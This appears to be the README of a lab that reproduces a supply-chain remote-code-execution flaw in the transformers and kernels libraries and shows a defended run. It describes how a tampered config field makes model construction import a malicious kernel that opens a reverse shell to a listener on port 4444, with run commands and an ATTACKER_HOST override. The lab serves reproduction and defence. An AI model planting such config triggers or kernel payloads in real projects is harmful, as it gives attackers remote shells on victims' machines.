# CVE-2026-4372 — No-Docker Lab (single host)

Self-contained reproduction of the `transformers` + `kernels` supply-chain RCE,
plus a defended run, on one plain machine (e.g. a RunPod CPU pod). No Docker, no
GPU, and no Hugging Face Hub access: the tampered model is loaded from a local
folder and the malicious kernel from a repo-local offline cache.

## How the attack works
The victim loads a model whose `payload/model/config.json` carries
`"_attn_implementation_internal": "malatker/evil-kernel"`. During model
**construction** (`PreTrainedModel.__init__` → `_check_and_adjust_attn_implementation`
→ `kernels.get_kernel` → import), `transformers` imports that kernel package from
the seeded offline cache, and its `__init__.py` opens a reverse shell to the
attacker on port 4444. It fires on construction — no inference, no GPU, no network,
and `trust_remote_code=False` does not prevent it.

## Layout
```
setup.sh            one-time: seed offline cache + ensure deps (torch 2.5.1+cu121, transformers 5.2.0, kernels)
attacker.sh         listener on :4444 (netcat, or a built-in Python listener if nc is absent)
victim.sh           runs the victim in attack or defend mode
victim_test.py      VULNERABLE loader (builds the model -> payload fires)
victim_safe.py      DEFENDED loader (routes the same model through ../defence/defence_mechanisms.py)
payload/model/      the tampered model (config.json is the trigger; no weights needed)
payload/evil-kernel/ the malicious kernel (its __init__.py is the reverse-shell body)
```
The defence itself lives at `../defence/defence_mechanisms.py` (single source of
truth); `victim.sh defend` puts that folder on `PYTHONPATH` automatically.

## Setup (once per machine)
```bash
bash setup.sh
```
Seeds the cache and installs/validates deps. The bundled kernel ships a
**`torch-universal`** build variant in addition to the original
`torch25-cxx98-cu121-x86_64-linux` one. `kernels` always falls back to
`torch-universal`, so **any CUDA build of torch works** — `setup.sh` installs the
default `torch` wheel (CUDA-enabled on Linux, with wheels for every supported
Python), rather than pinning `torch==2.5.1+cu121`. The only requirement is that
torch is a CUDA build (`torch.version.cuda` set); a CPU-only wheel makes the
`kernels` variant check raise.

## Run

**Terminal 1 — attacker (both modes):**
```bash
bash attacker.sh
```

**Terminal 2 — attack vs. defended:**
```bash
bash victim.sh            # VULNERABLE: reverse shell lands in Terminal 1
bash victim.sh defend     # DEFENDED:   load is blocked, Terminal 1 stays silent
```

- Attack: Terminal 2 stops at `malicious kernel imports NOW...`; the shell is live
  in Terminal 1 (type `id` — no prompt is shown, but it responds).
- Defended: Terminal 2 prints `[+] DEFENCE BLOCKED THE LOAD: ...` and exits; no
  connection reaches Terminal 1.

Split hosts: keep the listener as-is and run
`ATTACKER_HOST=<attacker-ip> bash victim.sh` on the victim.

## Which defence check fires
The defence (`../defence/defence_mechanisms.py`) runs four checks in order and
stops at the first failure. On this lab's **vulnerable** environment
(transformers 5.2.0 + `kernels` installed) with `allow_vulnerable_env=True`,
`victim.sh defend` is stopped by **Check 2 (kernels present)**, so the printed
reason is the kernels message — the config scan (Check 3) is never reached.

To demonstrate **Check 3 (the config scanner catching
`_attn_implementation_internal`)** as the blocker, run it against a simulated
patched version, which skips Checks 1–2:
```bash
python3 ../defence/defence_mechanisms.py payload/model --assume-version 5.3.0
```
Or remove the Check 2 trip for a real defended run via the scanner:
```bash
pip uninstall -y kernels && bash victim.sh defend   # reinstall kernels to attack again
```

## Notes
- `.hfcache/` and `__pycache__/` are runtime-generated and git-ignored.
- The reverse-shell target defaults to `127.0.0.1` (override with `ATTACKER_HOST`).
